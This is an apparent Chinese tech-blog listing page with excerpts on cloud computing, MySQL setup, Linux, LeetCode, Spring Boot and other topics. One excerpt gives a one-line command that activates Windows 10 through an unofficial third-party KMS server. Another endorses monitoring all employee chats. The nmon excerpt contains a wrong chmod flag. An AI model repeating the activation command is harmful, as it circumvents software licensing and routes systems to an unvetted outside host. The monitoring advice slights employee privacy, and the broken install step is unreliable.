			<a href="/posts/fda21184b415a65896cb9a60f5196524/" rel="bookmark">
			云计算相关概念
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 一、云计算的三种部署模式：公有云、私有云、混合云--区别和特性二、华为云：简介、主要业务、特点和优势、不同场景和行业中的应用三、华为云-三剑客：IaaS、PaaS、SaaS1、IaaS：基础架构即服务2、PaaS：平台即服务3、SaaS：软件即服务4、其他名词 四、华为云组件缩写与全拼 一、云计算的三种部署模式：公有云、私有云、混合云–区别和特性 区别：
随着云时代的到来，慢慢的演化出了更有针对性的产品服务，公有云，私有云，混合云。那么这三者之间有什么区别呢？我们用打比方的方式来说明。
例如我们来到一个城市需要睡觉，就要去酒店，酒店为我们提供房间休息，这就是公有云服务。
过了一阵子，觉得这个城市不错，自己花钱买了一套房子，供自己在里面休息或者做其他事，这是私有云服务。
某一天，家里来了很多亲朋好友，住不下了，一部分人住在家里，一部分人住在酒店，这就是混合云。
云的概念就是我们把房子和酒店这些服务都放在头顶一片云上，走到哪里就跟到哪里，只要我们需要就能及时给我们提供服务。
特性：
公有云：成本低，扩展性非常好，缺点是对于云端的资源缺乏控制、保密数据的安全性、网络性能和匹配性问题。
私有云：对数据保密、数据安全、服务质量都能有效控制，其最大的特点是安全性与私有化，是订制化解决方案的根本，对于对数据安全与稳定有要求的企业来说是非常好的选择。
混合云：它集公有云的方便便捷与私有云的安全稳定为一体。企业出于安全考虑会希望将数据存放在私有云上面，同时又希望能使用公有云的免费资源，所以就将公有云与私有云进行合理的混合运用，将敏感数据或是运行关键性的工作负载放在私有云上面，而一般的工作或是需要扩展的工作放在公有云上面，达到安全又省钱的目的。
二、华为云：简介、主要业务、特点和优势、不同场景和行业中的应用 华为云简介
华为云是华为公司推出的一项云计算服务。它提供了一系列的云计算产品和服务，包括云服务器、云存储、云数据库、云安全、人工智能、大数据分析等。华为云的产品和服务可以帮助企业和开发者构建和部署他们的应用程序，并且提供高可用性和高性能的基础设施。
华为云还提供了一系列的管理工具和控制台，帮助用户管理和监控他们的云资源。此外，华为云还提供了一系列的 API 和 SDK，供用户使用。
华为云主要面向中国市场，但也提供部分服务的海外地区。且正在努力拓展国际市场
亚马逊云、阿里云、腾讯云等其他公有云厂商一样, 华为云也提供了灵活的价格和计费模型，可以帮助用户根据自己的需求和预算来选择最适合的产品和服务。
华为云的主要业务
云服务器：提供弹性的云端计算能力，可以根据业务需求动态调整资源，并支持多种操作系统。
云存储：提供文件存储、对象存储、块存储等不同的存储服务，帮助用户存储和管理大量的数据。
云数据库：提供关系型数据库、NoSQL 数据库、分布式数据库等不同类型的数据库服务，帮助用户存储和管理数据。
云安全：提供云安全管理、云防火墙、云身份认证等多种安全服务，帮助用户保护云资源免受网络攻击和数据泄露。
人工智能：提供机器学习、自然语言处理、计算机视觉等多种人工智能服务，帮助用户提高应用程序的智能化水平。
大数据分析：提供大数据处理和分析服务，帮助用户收集、存储、处理和分析海量的数据。
云网络: 提供基础的网络设施服务，包括负载均衡、公网IP、VPN等，使得应用程序和服务能够在云环境中高效地部署和运行。
云桌面: 提供云桌面服务，帮助用户在云端实现桌面虚拟化，支持远程办公和灵活的资源调配。
CDN : 提供CDN服务，加速网站内容和应用程序的传输，降低网络延迟并提高用户体验。
开发者服务: 提供开发者工具和平台，帮助用户更快地构建和部署应用程序, 支持在线编程，提供配套的持续集成和部署等。
华为云在海外国家和地区的业务
华为云在海外的业务目前已经覆盖了多个国家和地区，包括欧洲、中东、非洲、东南亚、拉丁美洲等。
在欧洲，华为云已经在英国、法国、德国、意大利、西班牙、荷兰、瑞典、丹麦、挪威、芬兰、比利时、爱尔兰、奥地利、瑞士等国家设立了数据中心。
在中东，华为云在阿联酋、伊朗、伊拉克、沙特阿拉伯、卡塔尔、科威特、巴林等国家都有业务。
在非洲，华为云在南非、埃及、摩洛哥等国家有业务。
在东南亚，华为云在新加坡、马来西亚、泰国、菲律宾等国家有业务。
在拉丁美洲，华为云在墨西哥、巴西、阿根廷、智利、秘鲁等国家有业务。
这些地区的业务可能受到国家政策和法律规定的影响,华为会根据当地情况进行调整.
华为云在不同场景和行业中的应用
金融行业: 华为云提供了安全可靠的云服务，能够帮助金融机构提高数据安全性和合规性，并通过大数据分析和人工智能技术提高风控和运营效率。
教育行业: 华为云提供了云桌面和云存储服务，能够帮助教育机构实现远程办公和在线教学，提高教学质量和效率。
医疗行业：华为云提供了人工智能和大数据服务，能够帮助医疗机构提高诊断准确率和治疗效果，并通过云存储服务保障数据安全性。
政府机关: 华为云的云安全和大数据分析服务能帮助政府机关提高信息安全性和决策效率，同时提供云存储和云计算来支持政府数字化建设。
智能制造: 华为云提供了IoT 、人工智能和大数据分析服务，可以帮助智能制造企业提高生产效率和质量控制能力，通过设备连接和数据分析实现自动化和智能化管理。
零售行业: 华为云的云存储和大数据分析服务能帮助零售企业收集和分析客户数据，实现客户细分和个性化营销。同时云服务器和云数据库可以帮助企业实现电商平台的搭建和管理。
媒体和出版: 华为云提供了云存储和CDN服务，能够帮助媒体和出版机构管理和分发大量的媒体资源，并提高资源的分发效率。
三、华为云-三剑客：IaaS、PaaS、SaaS IaaS
Infrastructure-as-a-Service（基础设施即服务），它设计存在目的是作为基础设施来使用，提供给消费者的运算功能、存储、网络以及其他基础计算资源(基础设施)。不像PaaS那样作为平台提供完善的应用实现环境，需要自己导入中间件及操作系统，在此基础上实现运行应用程序。
PaaS
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fda21184b415a65896cb9a60f5196524/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/283660e886c9b987b8fbd4710eb48e71/" rel="bookmark">
			Linux高级系统编程- mysql数据库安装及环境配置
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		简介 数据库DB 数据库（ DataBase ， DB ）从本质上讲就是一个文件系统，它能够将数据有组织地集合在一起，按照一定的规则长期存储到计算机的磁盘中，并且能够供多个用户共享和 使用，同时，用户能够对数据库中的数据进行插入、删除、修改和查询等操作。 数据库管理系统DBMS 数据库管理系统（DataBase Management System ， DBMS 从本质讲就是一个为管 理数据库中的数据而设计的一套管理系统。它依托数据库，对外提供统一管理数据库中 数据的功能和接口能够有效地对数据库的安全、认证、数据 备份、数据恢复、数据传输等进行统一的管理。同时，数据库管理系统能够根据所依托的数据库模型对数据库进行相应的分类。大多数的数据库都是通过数据库管理系统对数据库中的数据进行管理和 维护的。 DB与DBMS的关系 数据库的分类 关系型数据库 依据所有存储数据的模型之间的关系建立的数据库。所谓关系模型，指的是“ 一对一、 一对多、多对多” 等 关系型。常见的关系型数据库如下： Oracle:是 Oracle 公司的数据库产品 Mysql: 最早属于瑞典的 MysqlAB 公司的，后被 Sun 公司收购， Sun 在 2009 年 4月 20 号被 Oracle 收购。 SQLServer:微软旗下的数据库产品 Access：微软旗下的数据库产品 DB2:IBM 公司旗下的数据库产品 非关系型数据库 泛指非关系型的数据库，区别于关系数据库。采用了没有特定关系模型来组织数据。常见的非关系型数据库如下： MongoDB:是一个面向文档的开源 NoSQL 数据库 .MongoDB 使用 JSON 之类的文档来存储任何数据. 它是用 c++ 写的。 Cassandra:是 Facebook 为收件箱搜索开发的 .Cassandra 是一个用于处理大量结构化数据的分布式数据存储系统 Redis:是最著名的键值存储。 Redis 是用 C 语言编写的。它是根据 BSD 授权的。 HBase:谷歌为 BigTable 数据库设计的分布式非关系数据库 数据库的安装及配置 安装 安装命令： sudo apt-get update #更新软件源 sudo apt-get install mysql-server #安装 mysql 安装过程会提示设置mysql root 用户的密码 连输两遍密码 启动或关闭MySQL 启动命令 service mysql start 关闭命令 service mysql stop 重启命令 service mysql restart 注意 : 默认安装完成后， MySQL 为启动状态 确认是否启动成功 命令 : sudo netstat -tap | grep mysql 注意 : mysql节点处于 LISTEN 状态表示启动成功 进入MySQL Shell 命令 : mysql -u root -p 回车 输入安装mysql 时的密码 mysql中文乱码 原因 ： character_set_server 默认设置是 latin1 查看命令 : show variables like "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/283660e886c9b987b8fbd4710eb48e71/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9213ad45cd870b41c7cbc5dccc8cfd78/" rel="bookmark">
			公司为什么要进行上网行为监控？能监控到哪些内容？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在如今的数字化时代中，互联网已经成为企业运营的重要组成部分。现在许多公司会选择对上网行为进行监控，究竟是为什么呢？
1.保护企业信息：防止敏感商业信息被竞争对手或恶意攻击者窃取。
2.保持合规：确保公司的员工遵守数据保护和隐私法规。
3.提高工作效率：监控员工的上网行为，可以帮助优化网络使用，减少不必要的浪费。
4.风险管理：识别可能的网络威胁，例如网络钓鱼或恶意软件。
所谓上网行为监控，就是企业使用特定的软件或硬件工具，对员工的互联网使用情况进行监控和管理，具体可以监控到哪些内容呢？
1.使用流量
能够监控每名员工使用流量情况，包括上传和下载网速、总流量等，针对上传和下载网速可设置预警，当达到阈值时通知管理端，确保员工可以正常使用。
2.访问网站
通过什么关键词搜索、访问了哪些网站、浏览了哪些内容，以及浏览时间等情况，都可以看到。可根据岗位需求设置网站访问权限，无权访问的员工可自主设置提示，当员工访问禁止访问网站时，会生成相关记录。
3.应用程序
在什么时间，运行了哪些应用，安装了哪些软件，安装软件的版本信息等情况都记录在内。支持分组设置应用使用权限，可对员工电脑运行程序进行远程关闭操作。
4.聊天内容
可以监控到员工所有的聊天记录，按照员工和聊天软件进行分类存储。可自主添加敏感词，聊天内容触发时通知管理端并生成相关记录，便于查看和管理。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ce33b78afb8ddd5e78fca7152229b0a3/" rel="bookmark">
			第三章 Linux的目录结构
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		第三章 Linux的目录结构 学习目标 1 熟悉Linux目录的组织习惯
2 熟悉一些Linux的常见目录及作用
第一节 Linux中的常见目录 Linux常见的目录结构，不同版本的Linux目录结构可能略有不同
Centos7的文件目录结构
Linux根目录下的常见目录及作用
1. /bin：★(/usr/bin,/usr/local/bin)
是Binary 的缩写, 这个目录存放着最经常使用的命令,Linux默认的环境变量已经包含该路径,所以可以直接使用该路径下的指令如 cd指令 可以通过echo $PATH查看系统环境变量来看是否包含了该目录
/usr/local/bin: /usr/local/sbin: /usr/bin: /usr/sbin: /bin: /sbin: /opt/jdk-17.0.7/bin: /root/bin: /opt/jdk-17.0.7/bin 2. /sbin：（super user binaries超级用户二进制文件）(/usr/sbin, /usr/local/sbin)
s就是Super User的意思，这里存放的是系统管理员使用的系统管理程序。
以上目录，任何命令在任意目录下都可执行命令
3. /home：★
存放普通用户的主目录，在Linux中每个用户都有一个自己的目录，一般该目录名是以用户的账号命名的。
4. /root：★
该目录为系统管理员，也称作超级权限者的用户主目录。
5. /lib：（library库）
系统开机所需要最基本的动态连接共享库，其作用类似于Windows里的DLL(Dynamic Link Library)动态链接库文件。几乎所有的应用程序都需要用到这些共享库。
6. /lost+found：
这个目录一般情况下是空的，当系统非法关机后，这里就存放了一些文件。
7. /etc：★（etcetera等等）（editable text configuration可编辑的文本配置）
所有的系统管理所需要的配置文件和子目录。my.cnf
8. /usr：★ （user用户）
这是一个非常重要的目录，用户的很多应用程序和文件都放在这个目录下，类似与windows下的program files目录。
9. /boot：★
这里存放的是启动Linux时使用的一些核心文件，包括一些连接文件以及镜像文件，自己的安装别放这里 10. /proc：（process file system进程文件系统）
这个目录是一个虚拟的目录，它是系统内存的映射，我们可以通过直接访问这个目录来获取系统信息。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ce33b78afb8ddd5e78fca7152229b0a3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/23f35dc070cd597218aa6d4c5108aa81/" rel="bookmark">
			【LeetCode】二分查找精选10题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
在排序数组中二分查找：
1. 二分查找（简单）
2. 搜索插入位置（简单）
3. 点名（简单）
4. 在排序数组中查找元素的第一个和最后一个位置（中等）
5. 山脉数组的峰顶索引（中等）
6. 寻找峰值（中等）
7. 寻找旋转排序数组中的最小值（中等）
8. 有序数组中的单一元素（中等）
在数值范围内二分查找：
1. x 的平方根（简单）
2. 爱吃香蕉的珂珂（中等）
第2题“搜索插入位置”必看，讲解了二段式二分查找循环条件为什么是left &lt; right和中点什么时候取靠左的什么时候取靠右的。
二分查找（Binary Search）也称折半查找，要求线性表必须采用顺序存储结构，而且表中元素按关键字有序排列。
首先，假设表中元素是按升序排列，将表中间位置记录的关键字与查找关键字比较，如果两者相等，则查找成功；否则利用中间位置记录将表分成前、后两个子表，如果中间位置记录的关键字大于查找关键字，则进一步查找前一子表，否则进一步查找后一子表。重复以上过程，直到找到满足条件的记录，使查找成功，或直到子表不存在为止，此时查找不成功。
二分查找算法每次将查找范围减少一半，因此对于一个长度为n的数组可能需要O(logn)次查找，每次查找只需要比较当前查找范围的中间数字和目标数字，在O(1)的时间可以完成，因此二分查找算法的时间复杂度是O(logn)。
在一个1~10的有序数组中查找数字7示意图：
二分查找法常用来在排序数组中查找和在一个数值范围内查找。
在排序数组中二分查找： 1. 二分查找（简单） 如果nums[mid] &lt; target，那么target一定在[mid + 1, right]区间内如果nums[mid] &gt; target，那么target一定在[left, mid - 1]区间内如果nums[mid] = target，找到target class Solution { public: int search(vector&lt;int&gt;&amp; nums, int target) { int n = nums.size(); int left = 0; int right = n - 1; while (left &lt;= right) { int mid = (left + right) / 2; // 如果left+right太大可能会溢出，下面这种写法不会溢出 // int mid = left + (right - left) / 2; if (nums[mid] &lt; target) { left = mid + 1; } else if (nums[mid] &gt; target) { right = mid - 1; } else { return mid; } } return -1; } }; 2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/23f35dc070cd597218aa6d4c5108aa81/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/df06fcdeb30611c8f83439463cc5e84a/" rel="bookmark">
			如何查看KylinOS银河麒麟操作系统版本?
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		如何查看KylinOS银河麒麟操作系统版本? 当前银河银河麒麟高级服务器操作系统V10发行版如下：
(Tercel) 版本是 银河麒麟 V10 SP1 版本 (Sword) 版本是 银河麒麟 V10 SP2 版本 (Lance) 版本是 银河麒麟 V10 SP3 版本 我们可使用如下三种方式（命令）进行对应银河麒麟操作系统版本的查询：
# 方式1. $ nkvers ############## Kylin Linux Version ################# Release: Kylin Linux Advanced Server release V10 (Lance) Kernel: 4.19.90-52.15.v2207.ky10.x86_64 Build: Kylin Linux Advanced Server release V10 (SP3) /(Lance)-x86_64-Build20/20221125 # 方式2. $ cat /etc/os-release NAME="Kylin Linux Advanced Server" VERSION="V10 (Lance)" ID="kylin" VERSION_ID="V10" PRETTY_NAME="Kylin Linux Advanced Server V10 (Lance)" ANSI_COLOR="0;31" # 方式3.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/df06fcdeb30611c8f83439463cc5e84a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ab03870938aa7844e03ad1fa322d000e/" rel="bookmark">
			服务端监控工具：Nmon使用方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、认识nmon 1、简介 nmon是一种在AIX与各种Linux操作系统上广泛使用的监控与分析工具，它能在系统运行过程中实时地捕捉系统资源的使用情况，记录的信息比较全面，
并且能输出结果到文件中，然后通过nmon_analyzer工具产生数据文件与图形化结果。
网站：
nmon and njmon | Site / Documentation
2、nmon可监控的数据类型 内存使用情况磁盘适配器文件系统中的可用空间CPU使用率页面空间和页面速度异步I/O，仅适用于AIX网络文件系统（NFS）磁盘I/O速度和读写比率服务器详细信息和资源内核统计信息消耗资源最多的进程运行队列信息 3、特点 ①、占用系统资源少（一般不到2%）
②、功能强大（监控数据类型全面）
③、结合grafana之类的仪表图，可以更直观的实时展示所监控的数据
④、移植性、兼容性较好
二、检查安装环境 # 查看操作系统的信息
uname -a
# 查看linux发行版本
lsb_release -a
我的操作系统为64位，linux版本为CentOS6.8版本，后面使用nmon要用对应的版本
三、nmon下载安装 1、下载方式 ①、下载到本地，通过FTP上传到服务器
②、命令行wget http://sourceforge.net/projects/nmon/files/nmon16e_mpginc.tar.gz
2、安装 下载完成后，执行以下命令：
# 新建一个nmon文件夹
mkdir nmon
# 新建一个nmon文件夹
mkdir nmon
# 移动，估计自己的版本选择合适的nmon版本移动过去
mv nmon_x86_64_centos6 /root/nmon
# 给工具授权
chmod -x nmon
也可以yum install nmon /apt-get install nmon
四、运行nmon 完成上面的操作后，切换到工具目录,执行./nmon_x86_64_centos6命令，出现如下界面，说明安装成功：
常用快捷命令说明：
1、# c
查看CPU相关信息
2、# m
查看内存相关信息
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ab03870938aa7844e03ad1fa322d000e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a97192e17bf83a29a5244efe007df572/" rel="bookmark">
			C&#43;&#43;vs2015 &#43; Qt5.9.8 Qt项目封装为动态库DLL文件并引用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、环境说明 开发环境：vs2015、qt5.9.8
开发语言：C++
二、实现意义 在项目开发中，由于开发需要或验收需要，可能会交付他人未开发完成的项目。
在这一过程中为防止源代码泄露，可以使用动态库封装的方法生成DLL文件并引用。
以下为Qt项目的封装流程。
三、操作流程 1、新建 Qt Class library 项目 2.将需要封装的源文件cpp与头文件h复制到新建项目文件路径下，并导入项目。
3.将源文件所依赖的其他基础文件引入到新建项目属性设置。
4. 在所有需要封装的头文件h内输入
#include "udpdllqt_global.h" 在所有需要封装的头文件h内的方法定义处，在方法名前加上宏命令。例如：
class UDPDLLQT_EXPORT pcSR { public: pcSR(); ~pcSR(); void init(); } 此处的“udpdllqt” 与 “UDPDLLQT” 均为所命名的新建Qt Class library项目名，应与自己新建的项目一致。
5.项目属性—&gt;常规—&gt;配置类型：动态库（.dll）
6.生成解决方案，即可得到udpDLLQT.dll、udpDLLQT.exp、udpDLLQT.lib
7.使用动态库文件时，将Dll文件、Lib文件与上文提到的头文件分别引入到需要使用库文件的项目属性中，引入步骤与以前博客相同不再赘述。
在需要使用库函数的位置引入头文件，即可使用动态库中的封装内容。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f83b43e8d05e9d0a2fe68c5564788887/" rel="bookmark">
			Spring Boot在请求的子线程中获取HttpServletRequest
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 1、方式一2、方式二3、总结 在一个请求的子线程中通过RequestContextHolder.getRequestAttributes()获取 requestAttributes 为空。
1、方式一 在子线程启动前，加入下面的代码，可以使 requestAttributes 被子线程继承。
RequestAttributes requestAttributes = RequestContextHolder.getRequestAttributes(); RequestContextHolder.setRequestAttributes(requestAttributes, true); 2、方式二 设置DispatcherServlet的threadContextInheritable属性设置为true。
import org.springframework.beans.factory.annotation.Autowired; import org.springframework.context.annotation.Configuration; import org.springframework.web.servlet.DispatcherServlet; import javax.annotation.PostConstruct; @Configuration public class ThreadContextInheritableConfig { @Autowired DispatcherServlet dispatcherServlet; @PostConstruct public void init() { // 将 LocaleContext 和 RequestAttributes 公开为子线程可继承。便于子线程获取到父线程的request dispatcherServlet.setThreadContextInheritable(true); } } 3、总结 这两种方法殊途同归，之所以子线程能获取到，都是将requestAttributes保存在InheritableThreadLocal中，从而保证在由当前线程创建的子线程中依然可以获取到数据。但是这两种方法在使用线程池依然无法生效。反而会找出线程数据泄露。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/46bab67bd2ec28723d3f9eaa96156866/" rel="bookmark">
			SpringBoot获取HttpServletRequest、HttpServletResponse的三种方式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 1、直接在Controller层方法参数上获取2、通过@Autowired注入3、通过RequestContextHolder获取 1、直接在Controller层方法参数上获取 仅仅适用在controller方法上。当Spring接收到HTTP请求时，会寻找一个合适的方法来处理该请求。如果该方法参数上标注了@RequestMapping或@Get、@Post等注解，Spring就会将HttpServletRequest对象注入到该参数中。
@RestController public class Controller { @RequestMapping("/test") public String test(HttpServletRequest request,HttpServletResponse response) { return "success"; } } 2、通过@Autowired注入 适用于所有的bean
@Autowired private HttpServletRequest request; @Autowired private HttpServletResponse response; @RequestMapping("/test") public String test() { Enumeration&lt;String&gt; headerNames = request.getHeaderNames(); response.setHeader("header","header_value"); return "success"; } 通过调试可以看到，注入的Reques是一个代理类，而这个被代理的目标由RequestObjectFactory.getObject() 获取
我们再看一下RequestObjectFactory.getObject() 的方法，最终还是走到了RequestContextHolder.getRequestAttributes()方法
private static class RequestObjectFactory implements ObjectFactory&lt;ServletRequest&gt;, Serializable { @Override public ServletRequest getObject() { return currentRequestAttributes().getRequest(); } @Override public String toString() { return "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/46bab67bd2ec28723d3f9eaa96156866/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/20e10386a292e76a0a873acc8cc10de4/" rel="bookmark">
			Windows10专业版万能激活
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.搜索cmd，以管理员权限打开。
2.进入cmd，输入以下代码：
slmgr /skms kms.v0v.bid &amp;&amp; slmgr /ato 3.回车，显示如下信息
成功激活啦！希望大家伙动动小手指点个赞吧！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b01b6a91b7f9ea240a9a46217089988c/" rel="bookmark">
			基于Java的校园二手交易平台
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		校园二手交易平台是基于Java语言，Springboot框架， Mysql数据库，Html/JavaScript/Css技术的高校二手交易平台。系统包含：前端和后端项目。角色分为：普通学生、管理员、 普通学生可以登录发布自己的二手产品，可以购买其他学生发布的二手产品；管理员对商品、用户等进行管理。
校园二手交易平台是基于Java语言，Springboot框架， Mysql数据库，Html/JavaScript/Css技术的高校二手交易平台。系统包含：前端和后端项目。角色分为：普通学生、管理员、 普通学生可以登录发布自己的二手产品，可以购买其他学生发布的二手产品；管理员对商品、用户等进行管理。
校园二手交易平台是基于Java语言，Springboot框架， Mysql数据库，Html/JavaScript/Css技术的高校二手交易平台。系统包含：前端和后端项目。角色分为：普通学生、管理员、 普通学生可以登录发布自己的二手产品，可以购买其他学生发布的二手产品；管理员对商品、用户等进行管理。
校园二手交易平台是基于Java语言，Springboot框架， Mysql数据库，Html/JavaScript/Css技术的高校二手交易平台。系统包含：前端和后端项目。角色分为：普通学生、管理员、 普通学生可以登录发布自己的二手产品，可以购买其他学生发布的二手产品；管理员对商品、用户等进行管理。
校园二手交易平台是基于Java语言，Springboot框架， Mysql数据库，Html/JavaScript/Css技术的高校二手交易平台。系统包含：前端和后端项目。角色分为：普通学生、管理员、 普通学生可以登录发布自己的二手产品，可以购买其他学生发布的二手产品；管理员对商品、用户等进行管理。
二、技术介绍: Java;SpringBoot;Html/Css/JavaScipt;Mysql
三、开发工具: 1.IntelliJ IDEA或者Myeclipse 3.Navicat 3.Mysql 4.JDK8
四、提供的服务： 源代码（前后端源代码+sql脚本）配套文档（一万字以上）一键启动项目（适合基础薄弱的同学，一键启动，无需搭建复杂环境）远程调试包运行 源代码和配套文档领取加文章最下方的名片哦~
package com.dong.controller.admin; import com.dong.config.TitleConfig; import com.dong.exception.CodeMsg; import com.dong.exception.Result; import com.dong.pojo.Student; import com.dong.service.StudentService; import com.dong.vo.PageResult; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.stereotype.Controller; import org.springframework.ui.Model; import org.springframework.util.StringUtils; import org.springframework.web.bind.annotation.*; @Controller @RequestMapping("admin/student") public class StudentController { @Autowired private TitleConfig titleConfig; @Autowired private StudentService studentService; @GetMapping("list") public String list(PageResult pageResult, @RequestParam(value = "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b01b6a91b7f9ea240a9a46217089988c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/eac83e5a22d20eab088d45563c5822c3/" rel="bookmark">
			MCS是什么，是虚拟化技术
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		MCS是什么，是虚拟化技术 MCS全称Machine Container Service，中文叫做系统容器，是一种以容器技术为基础的轻量级主机虚拟化技术。系统容器提供与虚拟机一致的行为，在华为云HCS场景下MCS主要是数据库相关服务使用。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/86b5509058dcf77165dd10208266372d/" rel="bookmark">
			基于协同过滤算法的图书推荐系统
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		基于协同过滤算法的图书推荐系统，通过计算皮尔逊相关系数，获取用户之间的相关系数，确定近邻用户，从而推荐用户感兴趣的图书。
源代码和配套文档领取加文章最下方的名片哦~
项目介绍视频：基于协同过滤算法的图书推荐系统，毕业设计真的可以这么简单！！！_哔哩哔哩_bilibili
协同过滤算法讲解视频：基于用户协同过滤算法讲解与演示_哔哩哔哩_bilibili
一、协同过滤算法 两个变量之间的皮尔逊相关系数定义为两个变量之间的协方差和标准差的商：
上式定义了总体相关系数，常用希腊小写字母
作为代表符号。估算样本的协方差和标准差，可得到皮尔逊相关系数，常用英文小写字母代表：
r亦可由样本点的标准分数均值估计，得到与上式等价的表达式：
总体和样本皮尔逊系数的绝对值小于或等于1。如果样本数据点精确的落在直线上（计算样本皮尔逊系数的情况），或者双变量分布完全在直线上（计算总体皮尔逊系数的情况），则相关系数等于1或-1
二、系统演示 算法核心代码：
public List&lt;RecommendedItem&gt; userBasedRecommender(long userID,int size) { // step:1 构建模型 2 计算相似度 3 查找k紧邻 4 构造推荐引擎 List&lt;RecommendedItem&gt; recommendations = null; try { Class.forName("com.mysql.jdbc.Driver"); MysqlDataSource dataSource = new MysqlDataSource(); dataSource.setServerName("localhost");//本地为localhost dataSource.setPort(3308); dataSource.setUser("root"); dataSource.setPassword(""); dataSource.setDatabaseName("bookstorm");//数据库名 DataModel dataModel=new MySQLJDBCDataModel(dataSource,"score_book","user_id","book_id","score","time"); //*/ File modelFile = new File("D:\\01-bus\\项目资源\\01_计算机软件专业\\1063-图书推荐系统\\01-源代码\\BookRecommend-master\\bookStore_new\\ratings1.csv"); // //System.out.println(modelFile); // DataModel model = new FileDataModel(modelFile);//构造数据模型 //UserSimilarity similarity1=new UncenteredCosineSimilarity(model); UserSimilarity similarity = new PearsonCorrelationSimilarity(dataModel);//用PearsonCorrelation 算法计算用户相似度 UserNeighborhood neighborhood = new NearestNUserNeighborhood(3, similarity, dataModel);//计算用户的“邻居”，这里将与该用户最近距离为 3 的用户设置为该用户的“邻居”。 Recommender recommender = new CachingRecommender(new GenericUserBasedRecommender(dataModel, neighborhood, similarity));//采用 CachingRecommender 为 RecommendationItem 进行缓存 recommendations = recommender.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/86b5509058dcf77165dd10208266372d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0905c5fd1fcac2ed52d268680092450c/" rel="bookmark">
			Echarts dataZoom关于filterMode的问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 我的项目是用 Echarts 构建一个曲线图。在图表中需要实现的功能有这些：
1、可通过鼠标左键实现区域选择后进行放大只看该区域数据
2、可通过鼠标左键双击恢复原图
3、可实现任意拖拽Markline
4、可通过滚动轴进行缩放等
整体效果
区域放大后效果
关注我，后面也会陆续记录一些相关的问题 今天记录在进行鼠标左键区域选择后，本没有关联的两个数据点自动连接的问题，如下图所示
本来这两个点之间还有一个数据点，但是因为区域选择没有选到，Echarts就默认为连接上了。
为了解决这个问题，翻看官网配置文档发现，是dataZoom的 filterMode属性在搞鬼
dataZoom 的运行原理是通过 数据过滤 以及在内部设置轴的显示窗口来达到 数据窗口缩放 的效果。
数据过滤模式（dataZoom.filterMode）的设置不同，效果也不同。
可选值为：
'filter'：当前数据窗口外的数据，被 过滤掉。即 会 影响其他轴的数据范围。每个数据项，只要有一个维度在数据窗口外，整个数据项就会被过滤掉。
'weakFilter'：当前数据窗口外的数据，被 过滤掉。即 会 影响其他轴的数据范围。每个数据项，只有当全部维度都在数据窗口同侧外部，整个数据项才会被过滤掉。
'empty'：当前数据窗口外的数据，被 设置为空。即 不会 影响其他轴的数据范围。
'none': 不过滤数据，只改变数轴范围。
如何设置，由用户根据场景和需求自己决定。经验来说：
当『只有 X 轴 或 只有 Y 轴受 dataZoom 组件控制』时，常使用 filterMode: 'filter'，这样能使另一个轴自适应过滤后的数值范围。
当『X 轴 Y 轴分别受 dataZoom 组件控制』时：
